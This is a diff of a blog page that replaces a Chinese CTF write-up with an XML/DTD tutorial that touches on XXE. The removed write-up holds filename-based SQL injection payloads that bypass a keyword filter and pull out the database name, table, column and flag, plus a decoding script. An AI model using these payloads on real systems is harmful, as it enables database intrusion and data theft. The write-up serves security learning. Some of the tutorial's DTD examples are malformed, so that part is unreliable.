@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>upload · Smtsec&#39;s Studio</title>
+    <title>XML &amp; DTD · Smtsec&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Smtsec&#39;s Studio.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">upload</a>
+                <a href="#" class="post-name">XML & DTD</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            upload
+            XML & DTD
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,20 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XML">XML</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "DTD">DTD</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">704</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.1k</span>Reading time: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/12/16</span>
+                    <span class="post-intro-time">2020/03/01</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,89 +403,127 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>  根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111);</p>
-<p>登录就出现了上传文件的页面如下：</p>
-<p><img src="https://s2.ax1x.com/2019/12/16/QhshQS.png" alt="QhshQS.png"></p>
-<p>尝试上传文件，发现只有jpg格式的文件可以上传<br>尝试上传php.jpg</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤；</p>
-<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong></p>
-<p>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名</span><br><span class="line"><span class="keyword">VALUES</span>（被插入新行中的值）</span><br></pre></td></tr></table></figure>
-
-<h2 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h2><ul>
-<li>构造payload：（文件名）<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(<span class="keyword">select</span> <span class="keyword">database</span>())+<span class="string">'.jpg</span></span><br></pre></td></tr></table></figure>
-
+        <h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><ul>
+<li><p>XML 指可扩展标记语言（EXtensible Markup Language）。</p>
 </li>
-</ul>
-<p>可以看到select被过滤了，尝试双写绕过：</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect database())+'.jpg</span><br></pre></td></tr></table></figure>
-
-<p>页面回显均为0；</p>
-<ul>
-<li>尝试转换格式：<br>转为16进制：<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect hex(database()))+'.jpg</span><br></pre></td></tr></table></figure>
-
+<li><p>XML 被设计用来结构化、传输和存储数据。(HTML被设计用于显示数据)</p>
 </li>
-</ul>
-<p>页面回显为：7765625</p>
-<ul>
-<li>分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)<br>转10进制输出:<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
-
+<li><p>XML没有预定义的标签，需自行定义。</p>
 </li>
-</ul>
-<p>*MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。<br>当定义的参数为NULL时，返回值将为NULL。<br>最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。<br>该函数出现在MySQL版本：<br>5.6语法：</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">CONV(N,<span class="params">from_base</span>,<span class="params">to_base</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>页面回显为：1.8446744073709552e19</p>
-<ul>
-<li>分析(回显科学计数法，应该是输出位数过长)<br>使用substr分割输出：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
-
+<li><p>XML 被设计为具有自我描述性</p>
+<h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>XML文档包含：</p>
 </li>
-</ul>
-<p>页面回显为：131277325825392</p>
-<ul>
-<li>转16进制再转为ascll,<br>得到：web_up<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeascll</span><span class="params">(number)</span>:</span></span><br><span class="line">    number=str(hex(number))[<span class="number">2</span>:]</span><br><span class="line">    s1=[number[i:(i+<span class="number">2</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(number),<span class="number">2</span>)]</span><br><span class="line">    s2=[int(i,<span class="number">16</span>)<span class="keyword">for</span> i <span class="keyword">in</span> s1]</span><br><span class="line">    s3=[chr(i)<span class="keyword">for</span> i <span class="keyword">in</span> s2]</span><br><span class="line">    s=<span class="string">""</span>.join(s3)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">changeascll(<span class="number">131277325825392</span>)</span><br></pre></td></tr></table></figure>
-
+<li><input checked disabled type="checkbox"> <p>XML声明</p>
 </li>
-</ul>
-<p>提取后半部分字符：1819238756</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">13</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
-
-<p>得到数据库名：web_upload</p>
-<ul>
-<li>同样使用上述方法爆表<br>payload：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
-
+<li><input disabled type="checkbox"> <p>DTD文档类型定义(可选)</p>
 </li>
-</ul>
-<p>114784820031327<br>112615676665705<br>126853610566245<br>得到表名：hello_flag_is_here</p>
-<ul>
-<li>爆字段<br>payload:<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='</span>hello_flag_is_her<span class="string">e' limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>115858377367398<br>7102823<br>得到字段名：i_am_flag</p>
-<ul>
-<li>爆值<br>payload：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>36427215695199<br>92806431727430<br>560750951</p>
-<ul>
-<li>得到值：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!_@<span class="keyword">m_Th</span>.<span class="keyword">e_F</span>!<span class="keyword">lag</span></span><br></pre></td></tr></table></figure>
-
+<li><input checked disabled type="checkbox"> <p>文档元素</p>
 </li>
 </ul>
 <hr>
+<p>XML文档可看作是一种树结构，由<code>树根</code>—&gt;<code>树叶</code>；</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="comment">&lt;!-- 定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>I miss you !<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/03/01/3cDwMq.png" alt="3cDwMq.png"></p>
+<h1 id="XML元素"><a href="#XML元素" class="headerlink" title="XML元素"></a>XML元素</h1><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。<br>一个元素可以包含：其他元素、文本、属性、或混合前几种元素<br><font color="#ff000" face="黑体" size="4">注意：</font></p>
+<ul>
+<li>元素标记区分大小写，<name> ≠<name>;</name></name></li>
+</ul>
+<p>XML元素标记命名规则:</p>
+<ul>
+<li>可以包含字母，数字及其它字符,不能以数字、下划线等标点符号开头;</li>
+<li>不能包含空格</li>
+<li>不能以字母 xml（或者 XML、Xml 等等）开始</li>
+</ul>
+<hr>
+<p>xml有且只有一个根元素，根元素的起始标记要放在所有其它元素起始标记之前，根元素的结束标记根放在其它所有元素的结束标记之后。</p>
+<h1 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h1><h2 id="XML属性"><a href="#XML属性" class="headerlink" title="XML属性"></a>XML属性</h2><p>属性值必须加引号</p>
+<h2 id="XML注释"><a href="#XML注释" class="headerlink" title="XML注释"></a>XML注释</h2><p>与HTML一致：<!--This is comment --></p>
+<h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><h3 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h3><p>由于XML中部分符号具有特殊意义，为避免解析器解析错误，以实体引用代替部分字符；</p>
+<p>在 XML 中，有 5 个预定义的实体引用：</p>
+<table>
+<thead>
+<tr>
+<th><code>&amp;lt;</code></th>
+<th>&lt;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&amp;gt;</code></td>
+<td>&gt;</td>
+</tr>
+<tr>
+<td><code>&amp;amp;</code></td>
+<td>&amp;</td>
+</tr>
+<tr>
+<td><code>&amp;apos;</code></td>
+<td>‘</td>
+</tr>
+<tr>
+<td><code>&amp;quot;</code></td>
+<td>“</td>
+</tr>
+<tr>
+<td>### 命名实体</td>
+<td></td>
+</tr>
+<tr>
+<td><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT A   "i"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT B   "am"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT C   "hacker"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">A</span>&gt;</span>&amp;A;<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">B</span>&gt;</span>&amp;B;<span class="tag">&lt;/<span class="name">B</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">C</span>&gt;</span>&amp;C;<span class="tag">&lt;/<span class="name">C</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p><strong>combine.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%parameterA;%parameterB;%parameterC;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterA "i"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterB "am"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterC "hacker"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY dtd SYSTEM "combine.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;content<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>引用格式：</p>
+<table>
+<thead>
+<tr>
+<th>参数实体</th>
+<th>%parameter_name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>其他实体</td>
+<td>&amp;name</td>
+</tr>
+</tbody></table>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY outfile SYSTEM "outfile.xml"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">outfile</span>&gt;</span>&amp;outfile<span class="tag">&lt;/<span class="name">outfile</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>XXE漏洞一般发生在应用程序解析XML输入时，没有处理好外部实体的加载；</p>
+<p>+++</p>
+<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><ul>
+<li><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
+</li>
+<li><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+</li>
+</ul>
+<p>1.内部的DOCTYPE声明<br>  <code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code>即<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[                           &lt;!--定义此文档为note类型--&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有四个元素--&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT to   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT from   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT heading   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT body   (#PCDATA)&gt;           &lt;!--定义元素的类型为#PCDATA--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>I miss you !<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.外部文档声明</p>
+<p><code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code>即<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br>  或<br><code>&lt;!DOCTYPE root-element  PUBLIC &quot;public_ID&quot; &quot;filename&quot;&gt;</code> 即<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;文件源&quot; &quot;文件名&quot;&gt;</code></p>
+<h2 id="声明元素"><a href="#声明元素" class="headerlink" title="声明元素"></a>声明元素</h2><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：<br><code>&lt;!ELEMENT element-name category&gt;
+或</code><!ELEMENT element-name (element-content)> </p>
+<hr>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>  XXE漏洞是由xml解析器配置不安全，解析器本身并不分析实体是否为恶意内容，仅检查xml文件是否有结构上的错误。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<p>关于：[XXE-PHP Audit Basic](<a href="https://singlemindedt.github.io/2020/02/29/XXE-PHP">https://singlemindedt.github.io/2020/02/29/XXE-PHP</a> Audit Basic/)</p>
+<p>++++</p>
+<p>参考：<a href="https://www.runoob.com/xml/xml-syntax.html" target="_blank" rel="noopener">菜鸟教程</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="https://singlemindedt.github.io">Smtsec</a>
-            <p>原文链接：<a href="https://singlemindedt.github.io/2019/12/16/upload/">https://singlemindedt.github.io/2019/12/16/upload/</a>
-            <p>发表日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 8:14:47 am</a>
-            <p>更新日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 30th 2019, 2:03:49 pm</a>
+            <p>原文链接：<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/">https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/</a>
+            <p>发表日期：<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/">March 1st 2020, 10:00:08 am</a>
+            <p>更新日期：<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/">March 2nd 2020, 9:29:43 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -491,17 +531,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/12/16/Python笔记1/" title= "Python笔记1">
-                    <div class="nextTitle">Python笔记1</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/12/13/安装PyCharm/" title= "安装PyCharm">
-                    <div class="prevTitle">安装PyCharm</div>
+                <a href= "/2020/02/29/2020-02-29-XXE-PHP-DOMDocument/" title= "XXE-PHP DOMDocument">
+                    <div class="prevTitle">XXE-PHP DOMDocument</div>
                 </a>
             
         </li>
@@ -624,7 +659,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload"><span class="toc-number">1.</span> <span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#初探"><span class="toc-number">1.1.</span> <span class="toc-text">初探</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析："><span class="toc-number">1.2.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实际操作："><span class="toc-number">1.3.</span> <span class="toc-text">实际操作：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML简介"><span class="toc-number">1.</span> <span class="toc-text">XML简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML结构"><span class="toc-number">2.</span> <span class="toc-text">XML结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML元素"><span class="toc-number">3.</span> <span class="toc-text">XML元素</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML语法"><span class="toc-number">4.</span> <span class="toc-text">XML语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML属性"><span class="toc-number">4.1.</span> <span class="toc-text">XML属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML注释"><span class="toc-number">4.2.</span> <span class="toc-text">XML注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实体引用"><span class="toc-number">4.3.</span> <span class="toc-text">实体引用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符实体"><span class="toc-number">4.3.1.</span> <span class="toc-text">字符实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参数实体"><span class="toc-number">4.3.2.</span> <span class="toc-text">参数实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#外部实体"><span class="toc-number">4.3.3.</span> <span class="toc-text">外部实体</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DTD"><span class="toc-number">5.</span> <span class="toc-text">DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#声明元素"><span class="toc-number">5.1.</span> <span class="toc-text">声明元素</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">6.</span> <span class="toc-text">XXE</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
